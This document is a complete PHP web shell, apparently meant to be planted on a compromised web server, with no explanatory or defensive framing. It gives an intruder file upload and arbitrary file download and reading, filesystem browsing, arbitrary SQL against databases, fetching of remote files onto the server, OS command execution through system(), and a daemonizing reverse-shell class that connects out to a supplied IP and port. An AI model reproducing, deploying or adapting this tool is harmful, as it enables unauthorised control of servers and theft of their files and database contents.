<?php
error_reporting(0);
ini_set('display_errors', 0);
if(isset($_GET['downloadf']) && ""!==isset($_GET['downloadf'])){
    $ff=$_GET['downloadf'];
    if(file_exists($ff) && is_readable($ff) && is_file($ff)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($ff).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: '.filesize($ff));
        flush();
        readfile($ff);
        exit;
    }
}
?>
<html>
<style>.c{margin:auto;color:white;width:90%;display:block;padding:10px;border:thick double #fb8c00;}.modal{display:none;position:fixed;z-index:1;left:0;top:0;width:100%;height:100%;overflow:auto;}.modal-content{background-color:#fefefe;margin:auto;padding:20px;border:1px solid #888;width:80%;}.close{color:#aaaaaa;float:right;font-size:28px;}.close:hover,.close:focus{color:#000;text-decoration:none;cursor:pointer;}</style>
<body style="background:#272822;">
<div class="c">
    <table style="width:100%;box-shadow:none;">
        <tr>
            <td style="width:50%;color:white;font-size:100%">
                <?php
                    $mods="";$modules=array("curl","PDO","pdo_mysql","pdo_pgsql","mysql","mysqli");
                    foreach($modules as $module){if(in_array($module,get_loaded_extensions())){$mods.=$module.", ";}}
                    $mods=substr($mods,0,-2);
                    if("WIN"===substr(PHP_OS,0,3)){$sep="\\";}else{$sep="/";}
                    echo "OS : ".php_uname()."<br/>"."User : ".exec("whoami")."<br/>"."Path : ".getcwd()."<br/>"."Version PHP : ".phpversion().' <button id="myBtn">phpinfo</button>';
                    if(ini_get('safe_mode')){echo "<div style='color:red'>Safe mod : on</div>";}else{echo "<div style='color:green'>Safe mod : off</div>";}echo "Interresting modules: ".$mods;
                ?>
            </td>
            <td style="width:50%;font-size:100%;">
                <form method="POST" action="" enctype="multipart/form-data" style="color:white">
                    Upload : <input type="file" name="file">
                    <input type="submit" value="Upload" name="submit">
                </form>
                <?php
                if(isset($_POST["submit"])){
                    $targetFile=basename($_FILES["file"]["name"]);
                    if(move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)){
                        echo "<h1 style='color:green'>file <a style='background-color:transparent;color:#fb8c00' target='_blank' href='./".basename( $_FILES["file"]["name"])."'>".basename( $_FILES["file"]["name"])."</a> uploaded</h1>";
                    }else{echo "<h1>Fail to upload</h1>";}
                }
                ?>
                <form method="POST" action="" target='_blank' style="color:white">
                    Reverse shell : <?php echo '<input type="text" placeholder="IP" name="ip" value="'.$_SERVER['REMOTE_ADDR'].'">'; ?>
                    <input type="text" placeholder="Port" name="port">
                    <input type="submit" value="reverse" name="reverse">
                </form>
                <form method="POST" action="" style="color:white">
                    Exploit modules : <input type="submit" value="Database explorer" name="dbex">
                </form>
            </td>
        </tr>
    </table>
</div>
<?php if(isset($_POST["dbex"])){ 
$dbn="";$dbh="";$dbu="";$dbp="";$tyco="";$tyd="";
if(isset($_POST['typeco'])){$tyco=$_POST['typeco'];}
if(isset($_POST['typedb'])){$tyd=$_POST['typedb'];}
if(isset($_POST['dbhost'])){$dbh=$_POST['dbhost'];}
if(isset($_POST['dbname'])){$dbn=$_POST['dbname'];}
if(isset($_POST['dbuser'])){$dbu=$_POST['dbuser'];}
if(isset($_POST['dbpass'])){$dbp=$_POST['dbpass'];}
?>
<div class="c">
    <form method="POST" action="" style="color:white">
    <h1>Database Explorer</h1>
    <table style="width:100%;box-shadow:none;"><tr><td>
        <select style="width:19%" name="typeco">
            <option <?php if($tyco===""){echo "selected";} ?> value="">--Select connection type--</option>
            <option <?php if($tyco==="PDO"){echo "selected";} ?> value="PDO">PDO</option>
            <option <?php if($tyco==="mysqli_connect"){echo "selected";} ?> value="mysqli_connect">mysqli_connect (mysql only)</option>
            <option <?php if($tyco==="pg_connect"){echo "selected";} ?> disabled value="pg_connect">pg_connect (postgres only) Doesn't work yet</option>
            <option <?php if($tyco==="mysql_connect"){echo "selected";} ?> disabled value="mysql_connect">mysql_connect (php<=5) Doesn't work yet</option>
        </select>
        <select style="width:19%" name="typedb">
            <option <?php if($tyd===""){echo "selected";} ?> value="">--Select db type (if PDO choice)--</option>
            <option <?php if($tyd==="mysql"){echo "selected";} ?> value="mysql">mysql</option>
            <option <?php if($tyd==="pgsql"){echo "selected";} ?> value="pgsql">postgres</option>
        </select>
        <input type="text" style="width:15%" placeholder="database host" name="dbhost" value="<?php echo htmlspecialchars($dbh,ENT_COMPAT); ?>">
        <input type="text" style="width:15%" placeholder="database name" name="dbname" value="<?php echo htmlspecialchars($dbn,ENT_COMPAT); ?>">
        <input type="text" style="width:15%" placeholder="database user" name="dbuser" value="<?php echo htmlspecialchars($dbu,ENT_COMPAT); ?>">
        <input type="text" style="width:15%" placeholder="database password" name="dbpass" value="<?php echo htmlspecialchars($dbp,ENT_COMPAT); ?>"><br/>
        <input type="TEXT" name="requdb" placeholder="SQL request" style="display:inline-block;margin:auto;width:99.1%;font-size:13pt">
    </td><td><input type="submit" value="Connect and Run command" name="dbex" style="height:30px;margin-top:10px"></td>
    </tr></table>        
    </form>
<?php 
if(isset($_POST['typeco']) && isset($_POST['typedb']) && isset($_POST['dbhost']) && isset($_POST['dbuser']) && isset($_POST['dbpass']) && isset($_POST['dbex']) && isset($_POST['dbname'])){
    if(""!==($_POST['typeco']) && ""!==($_POST['dbhost']) && ""!==($_POST['dbuser']) && ""!==($_POST['dbpass']) && ""!==($_POST['dbname'])){
        if("PDO"===($_POST['typeco']) && ""===($_POST['typedb'])){echo "<div style='color:red'>Fill db type for pdo connection</div>";}else{
            if($_POST['typeco']==="PDO"){
                try{$con = new PDO($_POST['typedb'].':host='.$_POST['dbhost'].';dbname='.$_POST['dbname'],$_POST['dbuser'],$_POST['dbpass']);
                    echo"<div style='color:green'>Db connexion succeed</div>";
                    if(isset($_POST['requdb']) && ""!==$_POST['requdb']){
                        if("select"===strtolower(substr($_POST['requdb'],0,6))){
                            $resultats=$con->query($_POST['requdb']);
                            $lo=1;$head="";$con="";
                            if(false!==$resultats){
                                while($donnees=$resultats->fetch(PDO::FETCH_OBJ)){
                                $con.="<tr>";
                                foreach($donnees as $key=>$d){
                                    if($lo===1){$head.="<td style='text-align:center;'>".$key."</td>";}
                                 $con.="<td>".$d."</td>";
                                }
                                $con.="</tr>";$lo=2;
                            }
                            echo $_POST['requdb']."<br/><table style='color:white;width:100%;box-shadow:none'><tr>".$head."</tr>".$con."</table>";
                            }else{echo "<div style='color:red'>No results (bad sql request ?)</div>";}
                        }else{$nch=$con->exec($_POST['requdb']);if(false!==$nch){echo"<div style='color:green'>Success : ".$nch."lines edited</div>";}else{echo "<div style='color:red'>No results (bad sql request ?)</div>";}}
                        $con = null;}
                    } catch(PDOException $e){echo "<div style='color:red'>Erreur !: ".$e->getMessage()."</div>";}
            }elseif($_POST['typeco']==="mysqli_connect"){
                $link=mysqli_connect($_POST['dbhost'],$_POST['dbuser'],$_POST['dbpass'],$_POST['dbname']);
                    if(!$link){
                        echo "<div style='color:red'>Error : Fail to connect to Mysql db.".PHP_EOL."</div>";
                        echo "<div style='color:red'>Debug errno : ".mysqli_connect_errno().PHP_EOL."</div>";
                        echo "<div style='color:red'>Debug error : ".mysqli_connect_error().PHP_EOL."</div>";
                        exit;
                    }else{
                        echo "<div style='color:green'>Db connexion succeed".PHP_EOL."</div>";
                        if(isset($_POST['requdb']) && ""!==$_POST['requdb']){
                            if("select"===strtolower(substr($_POST['requdb'],0,6))){
                                $lo=1;$head="";$con="";
                                if($res=$link->query($_POST['requdb'])){
                                    while ($donnees=$res->fetch_object()){
                                        $con.="<tr>";
                                        foreach($donnees as $key=>$d){
                                            if($lo===1){$head.="<td style='text-align:center;'>".$key."</td>";}
                                         $con.="<td>".$d."</td>";
                                        }
                                        $con.="</tr>";$lo=2;
                                    }
                                    echo $_POST['requdb']."<br/><table style='color:white;width:100%;box-shadow:none'><tr>".$head."</tr>".$con."</table>";
                                }else{echo "<div style='color:red'>No results (bad sql request ?)</div>";}
                            }else{
                                $res=$link->query($_POST['requdb']);
                                if($res){echo "<div style='color:green'>Success</div>";}else{echo "<div style='color:red'>Error (bad sql request ?)</div>";}}
                        }
                        mysqli_close($link);
                    }
                    
            }elseif($_POST['typeco']==="pg_connect"){
                echo "<div style='color:red'>pg_connect : not implemented yet</div>";
            }elseif($_POST['typeco']==="mysql_connect"){
                echo "<div style='color:red'>mysql_connect : not implemented yet</div>";
            }}
    }else{echo "<div style='color:red'>Fill all db info</div>";}
}
echo "</div>";
} ?>
<form method="POST" style="margin-block-end:0" action="<?php echo $_SERVER['REQUEST_URI']; ?>">
<div class="c">
    <h1>PHPcURL download</h1>
    <div style="display:block;margin:auto;width:max-content">
<input type="text" placeholder="URL" name="urlc" style="display:inline-block;margin:auto;width:500px;font-size:13pt">
<button type="submit" name="sub" style="display:inline-block;margin:auto;font-size:13pt">download</button>
</div>

<?php $result="";if(in_array("curl",get_loaded_extensions())){
?><div style="display:none"><?php
if(isset($_POST['urlc']) && ""!==$_POST['urlc']){
$source=$_POST['urlc'];$li=explode("/",$source);$saveTo=end($li);$fp=fopen($saveTo, 'w+');$ch=curl_init($source);
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
if(curl_errno($ch)){var_dump(curl_error($ch));}
$statusCode=curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);fclose($fp);
if($statusCode==200){if(file_exists($saveTo)){$result="<h1 style='color:green'>Downloaded : ./".$saveTo."</h1>";}else{$result="<h1 style='color:red'>Fail can't download (permission denied?)</h1>";}
}else{$result="<h1 style='color:red'>Fail status Code: ".$statusCode."</h1>";}}
?>
</div><br/><br/>
<?php echo $result; ?>
</div>
<?php } ?>
</form>
<form method="GET">
<div class="c">
    <h1>OS command</h1>
    <div style="display:block;margin:auto;width:max-content">
        <?php 
        if(isset($_GET['cmd'])){
            echo '<input type="TEXT" name="cmd" value="'.htmlspecialchars($_GET['cmd'],ENT_COMPAT).'" style="display:inline-block;margin:auto;width:500px;font-size:13pt">';
        }else{ ?>
            <input type="TEXT" name="cmd" style="display:inline-block;margin:auto;width:500px;font-size:13pt">
        <?php } ?>
        <input type="SUBMIT" value="Execute" style="display:inline-block;margin:auto;font-size:13pt">
    </div>
<div style="color:white;width:100%;display:block;padding:10px">
    <?php
        if(isset($_GET['cmd']) && ""!==$_GET['cmd']){
            echo "<h3>".htmlspecialchars("command : ".$_GET['cmd'])."</h3>";
            echo "<xmp>";
            system(escapeshellcmd($_GET['cmd'])); 
            echo "</xmp>";}
    ?>
</div></div>
<div class="c">
    <table style='width:100%;font-size:20pt'>
        <?php
        $content="";$uri=$uri_parts=explode('?',$_SERVER['REQUEST_URI'],2)[0];
        if(!isset($_GET["path"])){$fc="./";}else{$fc=$_GET["path"];}
        echo '<b style="font-size:200%">Folder/File : </b><input type="text" name="path" size="120" style="font-size:13pt" value="'.htmlspecialchars($fc,ENT_COMPAT).'"> <input type="SUBMIT" style="width:50px;font-size:13pt" value="go"><br/><br/>';
        if(is_dir($fc)){
            if(count($fc)==1&&("/"==$fc||"\\"==$fc)){$fc=$sep;$sep="";}elseif("/"===substr($fc,-1)||"\\"===substr($fc,-1)){$fc=substr($fc,0,-1);}
            $f=scandir($fc);
            foreach($f as $l){
                $p="<tr style='color:white;'><td style='width:15px;'>";
                if(is_readable($fc.$sep.$l)){
                    if(is_dir($fc.$sep.$l)){
                    $vars=$_GET;unset($vars['path']);unset($vars['filer']);if(0!==count($vars)){$queryUri=$uri."?".http_build_query($vars);$usep="&";}else{$queryUri=$uri;$usep="?";}
                    if($fc.$sep.$l===".".$sep."."||$fc.$sep.$l===".".$sep.".."){$cpwd=$fc.$sep.$l;}else{$cpwd=realpath($fc.$sep.$l);}
                    $p.="📁</td><td><a style='background-color:transparent;color:#CCCC00' href='".$queryUri.$usep."path=".$cpwd."'>".$cpwd."</a></td><td>".number_format(filesize($fc.$sep.$l)/1024,2)."KB</td><td>".substr(sprintf('%o',fileperms($fc.$sep.$l)),-4)."</td><td>N/A</td></tr>";
                 }else{
                    $vars=$_GET;unset($vars['filer']);if(0!==count($vars)){$queryUri=$uri."?".http_build_query($vars);$usep="&";}else{$queryUri=$uri;$usep="?";}
                    $cpwd=realpath($fc.$sep.$l);
                    $vars["filer"]=$fc.$sep.$l;
                    $p.="🗎</td><td><a style='background-color:transparent;color:#fb8c00' href='".$queryUri.$usep."filer=".$cpwd."'>".$cpwd."</a></td><td>".number_format(filesize($fc.$sep.$l)/1024,2)."KB</td><td>".substr(sprintf('%o',fileperms($fc.$sep.$l)),-4)."</td><td><a style='background-color:transparent;color:#fb8c00' href='".$queryUri.$usep."downloadf=".$cpwd."'>Download</a></td></tr>";}
                }else{
                    $p.="🛇</td><td style='color:red'>".$fc.$sep.$l."</td><td>".number_format(filesize($fc.$sep.$l)/1024,2)."KB</td><td style='color:red'>Denied</td><td>N/A</td></tr>";
                }
                
            echo $p;}
        }else{
            if(file_exists($fc)){
                $vars=$_GET;unset($vars['filer']);if(0!==count($vars)){$queryUri=$uri."?".http_build_query($vars);$usep="&";}else{$queryUri=$uri;$usep="?";}
                $cpwd=realpath($fc);
                echo "<tr style='color:white;'><td style='width:15px;'>🗎</td><td>".$fc."</td><td>".number_format(filesize($fc)/1024,2).'KB</td><td>Rights : '.substr(sprintf('%o',fileperms($fc)),-4)."</td><td><a style='background-color:transparent;color:#fb8c00' href='".$queryUri.$usep."downloadf=".$cpwd."'>Download</a></td></tr>";$content=file_get_contents($fc);$fti=$fc;}else{echo "File/Folder does not exist";
            }
        }   
        ?>
    </table>
    <?php
    if(isset($_GET["filer"])){$content=file_get_contents($_GET["filer"]);$fti=$_GET["filer"];}
    if(""!==$content){echo "<br/><b style='font-size:200%'>Content : ".$fti."</b><br/><xmp>".str_replace(["<xmp>","</xmp>"],[htmlspecialchars("<xmp>"),htmlspecialchars("</xmp>")],$content)."</xmp>";}elseif(isset($_GET["filer"]) && ""!==isset($_GET["filer"])){echo "<br/><b style='font-size:200%;color:red'>Impossible to display the content of : ".$fti.". Try to download it.</b>";}
    ?>
</div>
</form>
<div style="width:100%;display:block;padding:10px">
    <?php
        if(isset($_POST['reverse']) && isset($_POST['ip']) && isset($_POST['port'])){if(""!==$_POST['ip'] && ""!==$_POST['port']){
header('Content-Type: text/plain; charset=UTF-8');
class Shell {
    private $ip    = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w')
    );
    private $options = array();
    private $buffer  = 1024;
    private $clen    = 0;
    private $error   = false;
    public function __construct($ip, $port) {
        $this->ip   = $ip;
        $this->port = $port;
        if (stripos(PHP_OS, 'LINUX') !== false) {
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
            $this->options['bypass_shell'] = true;
        } else {
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
            exit(0);
        }
    }
    private function daemonize() {
        set_time_limit(0);
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else {
            if (($pid = pcntl_fork()) < 0) {
                echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
            } else if ($pid > 0) {
                echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
                exit(0);
            } else if (posix_setsid() < 0) {
                echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
            } else {
                echo "DAEMONIZE: Completed successfully!\n";
            }
        }
        umask(0);
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) {
            $this->error = true;
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) {
            $this->error = true;
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            echo $data; // script's dump
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
        }
    }
    private function brw($input, $output, $iname, $oname) {
        $size = fstat($input)['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            $this->offset($input, $iname, $this->clen);
            $size -= $this->clen;
            $this->clen = 0;
        }
        $fragments = ceil($size / $this->buffer);
        $remainder = $size % $this->buffer;
        while ($fragments && ($data = $this->read($input, $iname, $remainder && $fragments-- == 1 ? $remainder : $this->buffer)) && $this->write($output, $oname, $data)) {
            echo $data;
        }
    }
    private function offset($stream, $name, $offset) {
        while ($offset > 0 && $this->read($stream, $name, $offset >= $this->buffer ? $this->buffer : $offset)) {
            $offset -= $this->buffer;
        }
        return $offset > 0 ? false : true;
    }
    public function run() {
        $this->daemonize();
        $socket = @fsockopen($this->ip, $this->port, $errno, $errstr, 30);
        if (!$socket) {
            echo "SOC_ERROR: {$errno}: {$errstr}\n";
        } else {
            stream_set_blocking($socket, false);
            $process = proc_open($this->shell, $this->descriptorspec, $pipes, '/', null, $this->options);
            if (!$process) {
                echo "PROC_ERROR: Cannot start the shell\n";
            } else {
                foreach ($pipes as $pipe) {
                    stream_set_blocking($pipe, false);
                }
                fwrite($socket, "SOCKET: Shell has connected! PID: " . proc_get_status($process)['pid'] . "\n");
                while (!$this->error) {
                    if (feof($socket)) {
                        echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                    } else if (feof($pipes[1]) || !proc_get_status($process)['running']) {
                        echo "PROC_ERROR: Shell process has been terminated\n";   break;
                    }
                    $streams = array(
                        'read'   => array($socket, $pipes[1], $pipes[2]),
                        'write'  => null,
                        'except' => null
                    );
                    $num_changed_streams = stream_select($streams['read'], $streams['write'], $streams['except'], null);
                    if ($num_changed_streams === false) {
                        echo "STRM_ERROR: stream_select() failed\n"; break;
                    } else if ($num_changed_streams > 0) {
                        if ($this->os === 'LINUX') {
                            if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                            if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                            if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                        } else if ($this->os === 'WINDOWS') {
                            if (in_array($socket, $streams['read'])) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                            if (fstat($pipes[2])['size']/*-------*/) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                            if (fstat($pipes[1])['size']/*-------*/) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                        }
                    }
                }
                foreach ($pipes as $pipe) {
                    fclose($pipe);
                }
                proc_close($process);
            }
            fclose($socket);
        }
    }
}
$reverse_shell = new Shell($_POST['ip'], $_POST['port']);
$reverse_shell->Run();
            }
        }
    ?>
</div>
<div id="myModal" class="modal">
<div class="modal-content">
<span class="close">&times;</span>
<?php phpinfo(); ?>
</div>
</div>
</body>
<script>
var modal=document.getElementById("myModal");
var btn=document.getElementById("myBtn");
var span=document.getElementsByClassName("close")[0];
btn.onclick=function(){modal.style.display = "block";}
span.onclick=function(){modal.style.display = "none";}
window.onclick=function(event){if(event.target==modal){modal.style.display="none";}}
</script>
</html>
